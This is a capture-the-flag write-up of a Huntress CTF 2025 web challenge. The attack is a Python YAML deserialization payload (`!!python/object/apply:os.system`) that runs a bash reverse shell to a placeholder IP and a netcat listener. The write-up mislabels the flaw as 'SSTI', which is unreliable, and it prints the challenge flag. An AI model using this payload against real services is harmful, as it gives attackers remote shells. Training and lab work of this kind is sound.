> **Platform Name**: Huntress CTF 2025
> **Category**: (e.g., #Web, #Forensics, #ReverseEngineering)
> **Difficulty**: (e.g., Easy, Medium, Hard)
> **Date**: 10-05-2025
> **Author**: Joe Lipinski
---
## Table of Contents
1. [Introduction](#introduction)
2. [Setup](#Setup)
3. [Reconnaissance](#reconnaissance)
4. [Enumeration](#enumeration)
5. [Exploitation](#exploitation)
6. [Post-Exploitation/Flag](#Post-Exploitation/Flag)
7. [Lessons Learned](#lessons%20learned)
8. [References](#References)

---
## Introduction

**Description:**
"Oh wow, another web app interface for command-line tools that already exist!

This one seems a little busted, though..."

---
## Setup

- **Operating System:** Kali
- **Tools Used:** #terminal, #browser
- **Network Configuration:** OpenVPN
---
## Reconnaissance

### Initial Scanning
Initial scanning via nmap indicates that the web server is also serving an SSH server. The web server is werkzeug, a Python based web server. Indicating that the exploit may be python related.

``` bash
# Example: Nmap Scan
nmap -sC -sV 10.1.199.176
```

**Findings:**

``` bash
Nmap scan report for 10.1.199.176

Host is up (0.0097s latency).

Not shown: 997 closed tcp ports (conn-refused)

PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a1:81:c9:97:97:0f:bf:f2:08:a0:6d:44:df:2c:7a:71 (ECDSA)
|_  256 2b:1c:7b:ab:f2:cc:77:50:19:a0:37:1f:51:98:a9:f6 (ED25519)

80/tcp   open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Sigma Linter
|_http-server-header: nginx/1.24.0 (Ubuntu)

5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.11.13)
|_http-title: Sigma Linter
|_http-server-header: Werkzeug/3.1.3 Python/3.11.13

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
```

---
## Enumeration

### Web Enumeration
This webpage, served by the targeted host, allows the user to enter YAML-formatted text into a Sigma Rule Editor, which is parsed and linted after the user clicks on a button. The output is displayed in a validation results container. The page also provides example sigma rules, some of which work. Based on this, it is likely that this challenge is related to Python YAML deserialization SSTI. Trying various SSTI strings in different YAML fields eventually resulted in validation results indicating that the SSTI input was working correctly.

``` yaml
# Example: process_creation_cmd.yml base template
title: Basic Process Creation
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image: '*\cmd.exe'
  condition: selection
level: medium
```

**Interesting Discoveries:**
- **SSTI Injectable Fields**: By injecting SSTI into the input, system resources can be invoked through the web interface.

---
## Exploitation

### Vulnerability Identification
The SSTI injection vulnerability revolves around using the `!!python/object/apply:os.system ["INSERT_COMMAND_HERE"]` into various fields in the Sigma Rule Editor input field. The title and image fields were tested, and when submitted using the "Lint Rule" button, resulted in a system returned value in the Validation Results container.  After establishing a listener using `nc -nvlp 9001` and sending the `bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'` command as part of the SSTI string, the target establishes a reverse shell.

**Exploitation Steps:**
1. Ensure that the base YAML template is not malformed and is acceptable
2. Establish a listening using `nc -nvlp 9001`
3. Inject SSTI into one of the YAML fields using `!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'"]`
4. Submit using the 'Lint Rule' button
5. Profit!

``` YAML
# Example: process_creation_cmd.yml modified template
title: Basic Process Creation
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image: !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'"]
  condition: selection
level: medium
```

---
## Post-Exploitation/Flag
### Capturing the Flag
Using `ls` revealed the flag.txt file in the targeted user's home directory.

```bash
cat flag.txt
```

> [!success] Flag
> `flag{b692115306c8e5c54a2c8908371a4c72}`

---
## Lessons Learned
- It's common to see some returned system output when a successful SSTI attack has occurred. The returned output may not always be meaningful or related to the command used to perform the SSTI attack.
- Some fields may be sanitized or escaped, so it's important to try SSTI attacks on multiple fields.

---
**Disclaimer** 
This write-up is for educational purposes only. Always obtain proper authorization before testing or exploiting any system.